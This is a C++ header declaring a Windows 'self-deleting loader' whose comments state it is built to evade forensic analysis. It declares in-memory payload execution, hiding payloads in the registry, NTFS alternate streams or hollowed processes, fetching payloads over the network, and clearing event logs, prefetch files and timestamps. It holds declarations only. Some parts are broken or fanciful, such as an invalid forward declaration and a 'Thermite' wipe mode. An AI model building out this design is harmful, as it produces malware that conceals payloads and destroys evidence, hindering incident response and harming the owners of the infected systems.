#pragma once

#include <windows.h>
#include <vector>
#include <string>
#include <memory>
#include <unordered_map>
#include <chrono>
#include <mutex>
#include <functional>
#include "SecurityTypes.h"

namespace Aether::Loader {

    // Forward declarations
    class AI::AIController;
    class EncryptionManager;
    class SecureStorage;
    class AntiForensics;

    /**
     * @brief Self-Deleting & On-Demand Loader System
     * @details Provides secure loading mechanisms with automatic disk deletion
     *          and encrypted recall capabilities to evade forensic analysis
     */
    class SelfDeletingLoader {
    public:
        enum class LoaderState {
            Dormant,        // Loader is not active
            Loading,        // Currently loading payload
            Executing,      // Payload is executing
            SelfDeleting,   // Self-deletion in progress
            Deleted,        // Successfully deleted from disk
            Recalled        // Recalled from encrypted storage
        };

        enum class DeletionMethod {
            SimpleDelete,       // Basic file deletion
            SecureWipe,        // Overwrite with random data
            DODWipe,           // DOD 5220.22-M standard
            GutmannWipe,       // Gutmann 35-pass method
            AIObfuscation,     // AI-guided obfuscation
            Thermite          // Military-grade destruction simulation
        };

        enum class RecallMethod {
            MemoryResident,    // Keep in encrypted memory
            NetworkFetch,      // Download from remote location
            RegistryStorage,   // Hide in Windows registry
            AlternateStream,   // NTFS alternate data streams
            ProcessHollowing,  // Hide in legitimate process
            AIGenerated       // AI regenerates the payload
        };

        struct LoaderConfig {
            std::string executablePath;
            std::string backupLocation;
            DeletionMethod deletionMethod = DeletionMethod::SecureWipe;
            RecallMethod recallMethod = RecallMethod::MemoryResident;
            std::vector<uint8_t> encryptionKey;
            bool enableAntiForensics = true;
            bool enableSelfIntegrityCheck = true;
            std::chrono::minutes autoDeleteDelay{5};
            bool enableAIObfuscation = true;
        };

        struct LoaderMetrics {
            uint32_t loadAttempts;
            uint32_t successfulLoads;
            uint32_t deletionAttempts;
            uint32_t successfulDeletions;
            uint32_t recallAttempts;
            uint32_t successfulRecalls;
            uint32_t forensicsEvasions;
            std::chrono::milliseconds totalLoadTime;
            std::chrono::milliseconds totalDeletionTime;
            std::chrono::steady_clock::time_point lastActivity;
        };

        struct PayloadInfo {
            std::string originalPath;
            std::string payloadHash;
            std::vector<uint8_t> encryptedPayload;
            std::vector<uint8_t> obfuscatedMetadata;
            LoaderState state;
            std::chrono::steady_clock::time_point creationTime;
            std::chrono::steady_clock::time_point lastAccess;
            RecallMethod storageMethod;
            bool isIntegrityValid;
        };

    private:
        std::unique_ptr<AI::AIController> m_aiController;
        std::unique_ptr<EncryptionManager> m_encryptionManager;
        std::unique_ptr<SecureStorage> m_secureStorage;
        std::unique_ptr<AntiForensics> m_antiForensics;

        LoaderConfig m_config;
        LoaderState m_currentState;
        PayloadInfo m_payloadInfo;
        LoaderMetrics m_metrics;

        mutable std::mutex m_stateMutex;
        mutable std::mutex m_payloadMutex;

        // Self-deletion management
        HANDLE m_selfDeleteTimer;
        std::function<void()> m_deletionCallback;
        bool m_isDeletionScheduled;

        // Memory resident payload storage
        std::vector<uint8_t> m_memoryPayload;
        LPVOID m_memoryAddress;
        SIZE_T m_memorySize;

    public:
        explicit SelfDeletingLoader(std::shared_ptr<AI::AIController> aiController);
        ~SelfDeletingLoader();

        // Initialization and lifecycle
        bool Initialize(const LoaderConfig& config);
        void Shutdown();
        bool IsInitialized() const;

        // Loading operations
        bool LoadPayload(const std::string& payloadPath);
        bool LoadFromMemory(const std::vector<uint8_t>& payloadData);
        bool LoadFromEncryptedStorage();
        HMODULE GetLoadedModule() const;

        // Self-deletion operations
        bool ScheduleSelfDeletion(std::chrono::milliseconds delay);
        bool ExecuteImmediateDeletion();
        bool SecureWipeFile(const std::string& filePath, DeletionMethod method);
        bool VerifyDeletion(const std::string& filePath);

        // Recall operations  
        bool PrepareForRecall();
        bool RecallPayload();
        bool StorePayloadSecurely(RecallMethod method);
        bool VerifyPayloadIntegrity();

        // Anti-forensics
        bool EraseForensicTraces();
        bool ObfuscateFileSystemMetadata();
        bool ClearEventLogs();
        bool WipePageFile();
        bool SecureUnmapMemory();

        // AI integration
        DeletionMethod SelectOptimalDeletionMethod();
        RecallMethod SelectOptimalRecallMethod();
        std::vector<uint8_t> GenerateAIObfuscatedPayload();
        bool AdaptToForensicAnalysis();

        // State management
        LoaderState GetState() const;
        bool TransitionToState(LoaderState newState);
        PayloadInfo GetPayloadInfo() const;

        // Security features
        bool PerformIntegrityCheck();
        bool DetectForensicAnalysis();
        bool ActivateAntiAnalysisMeasures();
        bool GenerateDecoyFiles();

        // Utility and management
        LoaderMetrics GetMetrics() const { return m_metrics; }
        void ResetMetrics();
        bool ExportSecureBackup(const std::string& backupPath);
        bool ImportSecureBackup(const std::string& backupPath);

        // Configuration
        void SetDeletionMethod(DeletionMethod method) { m_config.deletionMethod = method; }
        void SetRecallMethod(RecallMethod method) { m_config.recallMethod = method; }
        void SetAutoDeleteDelay(std::chrono::minutes delay) { m_config.autoDeleteDelay = delay; }

    private:
        // Core loading implementations
        bool LoadPayloadInternal(const std::vector<uint8_t>& payloadData);
        bool PreparePayloadForExecution(const std::vector<uint8_t>& payloadData);
        bool ExecutePayloadInMemory();
        bool UnloadPayload();

        // Deletion implementations
        bool SimpleFileDelete(const std::string& filePath);
        bool SecureFileWipe(const std::string& filePath, uint32_t passes);
        bool DODStandardWipe(const std::string& filePath);
        bool GutmannMethodWipe(const std::string& filePath);
        bool AIGuidedObfuscation(const std::string& filePath);

        // Recall implementations
        bool StoreInMemory();
        bool StoreInRegistry();
        bool StoreInAlternateStream();
        bool StoreInProcessHollow();
        bool RecallFromMemory();
        bool RecallFromRegistry();
        bool RecallFromAlternateStream();
        bool RecallFromProcessHollow();

        // Security implementations
        std::vector<uint8_t> EncryptPayload(const std::vector<uint8_t>& payload);
        std::vector<uint8_t> DecryptPayload(const std::vector<uint8_t>& encryptedPayload);
        bool ValidatePayloadSignature(const std::vector<uint8_t>& payload);
        std::string CalculatePayloadHash(const std::vector<uint8_t>& payload);

        // Anti-forensics implementations
        bool WipeFileSlack(const std::string& filePath);
        bool WipeJournalEntries();
        bool ClearPrefetchFiles();
        bool WipeSystemTraces();
        bool ModifyFileTimestamps();

        // Utility methods
        bool IsFilePresent(const std::string& filePath);
        std::vector<uint8_t> ReadFileToMemory(const std::string& filePath);
        bool WriteMemoryToFile(const std::string& filePath, const std::vector<uint8_t>& data);
        std::string GenerateTempPath();
        bool IsProcessElevated();

        // Callback handlers
        static void CALLBACK DeletionTimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired);
        void HandleDeletionTimer();
    };

    /**
     * @brief Encryption Manager for payload protection
     */
    class EncryptionManager {
    public:
        enum class EncryptionType {
            AES256,
            ChaCha20,
            Blowfish,
            RSA,
            Hybrid,
            AICustom
        };

        struct EncryptionContext {
            EncryptionType type;
            std::vector<uint8_t> key;
            std::vector<uint8_t> iv;
            std::vector<uint8_t> salt;
            uint32_t iterations;
        };

    private:
        EncryptionContext m_context;
        std::shared_ptr<AI::AIController> m_aiController;

    public:
        explicit EncryptionManager(std::shared_ptr<AI::AIController> aiController);
        bool Initialize(EncryptionType type);
        std::vector<uint8_t> Encrypt(const std::vector<uint8_t>& data);
        std::vector<uint8_t> Decrypt(const std::vector<uint8_t>& encryptedData);
        bool GenerateKey(size_t keySize);
        EncryptionContext GetContext() const;
    };

    /**
     * @brief Secure Storage for payload backup and recall
     */
    class SecureStorage {
    public:
        enum class StorageLocation {
            Registry,
            AlternateStream,
            ProcessMemory,
            NetworkCache,
            EncryptedFile,
            MemoryMapped
        };

        struct StorageEntry {
            std::string identifier;
            StorageLocation location;
            std::vector<uint8_t> data;
            std::vector<uint8_t> metadata;
            std::chrono::steady_clock::time_point timestamp;
            bool isEncrypted;
        };

    private:
        std::unordered_map<std::string, StorageEntry> m_storageMap;
        std::shared_ptr<EncryptionManager> m_encryptionManager;

    public:
        explicit SecureStorage(std::shared_ptr<EncryptionManager> encryptionManager);
        bool Store(const std::string& identifier, const std::vector<uint8_t>& data, 
                  StorageLocation location);
        std::vector<uint8_t> Retrieve(const std::string& identifier);
        bool Remove(const std::string& identifier);
        std::vector<std::string> ListStoredItems();
        bool VerifyIntegrity(const std::string& identifier);
    };

    /**
     * @brief Anti-Forensics module for trace elimination
     */
    class AntiForensics {
    public:
        enum class ForensicThreat {
            DiskAnalysis,
            MemoryDump,
            NetworkAnalysis,
            ProcessAnalysis,
            RegistryAnalysis,
            TimelineAnalysis
        };

        struct ForensicEvent {
            ForensicThreat threat;
            std::string description;
            std::chrono::steady_clock::time_point timestamp;
            bool wasMitigated;
        };

    private:
        std::vector<ForensicEvent> m_forensicEvents;
        std::shared_ptr<AI::AIController> m_aiController;

    public:
        explicit AntiForensics(std::shared_ptr<AI::AIController> aiController);
        bool Initialize();
        bool EraseFileSystemTraces();
        bool EraseMemoryTraces();
        bool EraseRegistryTraces();
        bool EraseNetworkTraces();
        bool DetectForensicActivity();
        bool ActivateCountermeasures(ForensicThreat threat);
        std::vector<ForensicEvent> GetForensicEvents() const;
    };

} // namespace Aether::Loader